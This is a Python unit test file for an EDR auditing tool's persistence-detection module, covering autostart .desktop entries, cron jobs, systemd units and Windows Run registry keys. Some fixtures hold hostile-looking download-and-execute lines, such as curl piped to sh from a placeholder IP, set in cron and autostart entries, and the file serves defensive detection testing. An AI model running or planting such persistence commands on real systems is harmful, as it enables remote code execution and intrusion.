import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "src"))

from edr_auditor.modules.persistence import (
    audit_persistence, _parse_desktop_exec, _cron_jobs, _unit_exec_start,
)
from edr_auditor.hive import HiveBuilder, REG_SZ

CFG = {"scan_scope": {}}


def _ctx(files=None, cron=None, systemd=None, enabled=None, hives=None, mode="fixture"):
    return {
        "mode": mode,
        "autostart_files": files or {},
        "crontab_files": cron or {},
        "systemd_files": systemd or {},
        "systemd_enabled": enabled or set(),
        "hives": hives or {},
    }


class TestDesktopParsing(unittest.TestCase):
    def test_extracts_exec(self):
        content = "[Desktop Entry]\nType=Application\nExec=/usr/bin/foo --x\nHidden=false\n"
        self.assertEqual(_parse_desktop_exec(content), "/usr/bin/foo --x")

    def test_hidden_returns_none(self):
        content = "[Desktop Entry]\nExec=whatever\nHidden=true\n"
        self.assertIsNone(_parse_desktop_exec(content))

    def test_no_entry_returns_none(self):
        self.assertIsNone(_parse_desktop_exec("Exec=foo\n"))


class TestCronParsing(unittest.TestCase):
    def test_skips_env_and_comments(self):
        lines = list(_cron_jobs("# comment\nMAILTO=root\n*/5 * * * * echo hi\n"))
        self.assertEqual(len(lines), 1)
        self.assertEqual(lines[0][0], "*/5 * * * * echo hi")
        self.assertEqual(lines[0][1], "echo hi")

    def test_at_keyword(self):
        lines = list(_cron_jobs("@reboot /usr/local/bin/x.sh\n"))
        self.assertEqual(lines[0][1], "/usr/local/bin/x.sh")


class TestSystemdParsing(unittest.TestCase):
    def test_exec_start(self):
        content = "[Unit]\nDescription=x\n[Service]\nExecStart=/tmp/evil --x\n"
        self.assertEqual(_unit_exec_start(content), "/tmp/evil --x")


class TestAutostartFindings(unittest.TestCase):
    def test_benign_low(self):
        ctx = _ctx(files={"a.desktop": "[Desktop Entry]\nExec=/usr/local/bin/ok\nHidden=false\n"})
        findings = audit_persistence(ctx, CFG)
        titles = [f.title for f in findings]
        self.assertTrue(any("Autostart entry" in t for t in titles))
        self.assertFalse(any("Suspicious" in t for t in titles))

    def test_suspicious_high(self):
        ctx = _ctx(files={
            "bad.desktop": "[Desktop Entry]\nExec=/tmp/evil.sh --auto https://192.0.2.1/x\nHidden=false\n"
        })
        findings = audit_persistence(ctx, CFG)
        sus = [f for f in findings if "Suspicious autostart" in f.title]
        self.assertEqual(len(sus), 1)
        self.assertEqual(sus[0].severity, "medium")

    def test_download_chain_high(self):
        ctx = _ctx(files={
            "bad.desktop": "[Desktop Entry]\nExec=bash -c 'curl http://192.0.2.1/x | sh'\nHidden=false\n"
        })
        findings = audit_persistence(ctx, CFG)
        sus = [f for f in findings if "Suspicious autostart" in f.title]
        self.assertEqual(sus[0].severity, "high")

    def test_hidden_skipped(self):
        ctx = _ctx(files={"h.desktop": "[Desktop Entry]\nExec=/tmp/x\nHidden=true\n"})
        findings = audit_persistence(ctx, CFG)
        self.assertEqual(findings, [])

    def test_cron_suspicious(self):
        ctx = _ctx(cron={"u.cron": "*/5 * * * * curl -s http://192.0.2.5/run.sh | sh\n"})
        findings = audit_persistence(ctx, CFG)
        self.assertTrue(any("Suspicious cron job" in f.title for f in findings))

    def test_systemd_unit_and_enabled_high(self):
        ctx = _ctx(systemd={"evil.service": "[Service]\nExecStart=/tmp/k\n"},
                   enabled={"evil.service"})
        findings = audit_persistence(ctx, CFG)
        titles = [f.title for f in findings]
        self.assertTrue(any("Systemd unit" in t for t in titles))
        self.assertTrue(any("Suspicious systemd" in t for t in titles))


class TestHiveRunFindings(unittest.TestCase):
    def test_runkey_surfaced(self):
        workdir = "/tmp/edr_test_run_%d" % os.getpid()
        os.makedirs(workdir, exist_ok=True)
        path = os.path.join(workdir, "SOFTWARE")
        b = HiveBuilder()
        b.add_key("Microsoft\\Windows\\CurrentVersion\\Run")
        b.add_value("Microsoft\\Windows\\CurrentVersion\\Run", "Updater",
                    REG_SZ, r"C:\Users\Public\updater.exe")
        b.write(path)
        from edr_auditor.hive import HiveRegistry
        ctx = _ctx(hives={"hklm": HiveRegistry(path)}, mode="hive")
        findings = audit_persistence(ctx, CFG)
        titles = "\n".join(f.title for f in findings)
        self.assertIn("Updater", titles)
        self.assertIn("hklm", titles)


if __name__ == "__main__":
    unittest.main()